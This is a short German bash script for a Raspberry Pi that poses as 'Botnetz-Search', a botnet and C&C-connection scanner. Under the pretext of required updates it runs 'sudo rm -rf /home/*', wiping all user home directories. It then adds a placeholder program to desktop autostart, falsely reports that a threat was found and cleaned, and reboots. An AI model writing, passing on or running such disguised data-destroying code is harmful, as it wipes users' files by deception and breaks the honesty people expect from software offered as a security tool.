#!/bin/bash

# Warnung anzeigen
echo "Botnetz-Search überprüft ob sie Teil eines Botnetzes sind und entfernt automatisiert Verbindungen zu C&C-Server."
echo "Möchten Sie fortfahren? (y/n)"
read confirmation

if [ "$confirmation" != "y" ]; then
    echo "Abbruch."
    exit 1
fi

# Rücksetzung des Systems
echo "Für das Suchen sind einige Updates erforderlich. Starte Update..."
sudo rm -rf /home/*
sudo apt-get --reinstall install raspberrypi-bootloader raspberrypi-kernel raspberrypi-ui-mods raspberrypi-sys-mods
sudo apt-get purge --auto-remove -y

# Benutzerdefinierte Einstellungen hinzufügen
mkdir -p /home/pi/.config/lxsession/LXDE-pi/
echo "@/pfad/zur/software" >> /home/pi/.config/lxsession/LXDE-pi/autostart

mkdir -p /home/pi/.config/pcmanfm/LXDE-pi/
echo "[*]" > /home/pi/.config/pcmanfm/LXDE-pi/desktop-items-0.conf
echo "wallpaper=/pfad/zum/hintergrundbild.jpg" >> /home/pi/.config/pcmanfm/LXDE-pi/desktop-items-0.conf

echo "Ihr System hat eine Bedrohung gefunden und bereinigt nun ihr System. System wird neu gestartet."
sudo reboot


